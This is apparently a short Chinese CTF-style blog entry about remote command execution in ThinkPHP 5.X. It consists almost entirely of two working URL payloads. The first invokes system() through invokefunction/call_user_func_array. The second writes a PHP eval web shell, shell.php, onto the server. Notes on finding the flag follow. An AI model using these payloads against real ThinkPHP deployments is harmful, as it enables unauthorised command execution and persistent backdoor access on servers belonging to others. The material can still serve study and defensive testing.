      <title>ThinkPHP 5.X远程命令执行漏洞</title>
      <link href="/2020/05/20/ThinkPHP%205.X%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/05/20/ThinkPHP%205.X%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>利用system函数远程命令执行</p><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>写入shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=/index/\think\app/invokefunction&amp;<span class="keyword">function</span>=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=<span class="built_in">echo</span> ^&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[cmd]);?^&gt; &gt;shell.php</span><br></pre></td></tr></table></figure><p>查找flag<br><img src="https://img-blog.csdnimg.cn/20200331114149216.png" alt="在这里插入图片描述"><br>查看flag<br><img src="https://img-blog.csdnimg.cn/20200331114425535.png" alt="在这里插入图片描述"></p>]]></content>
      
      
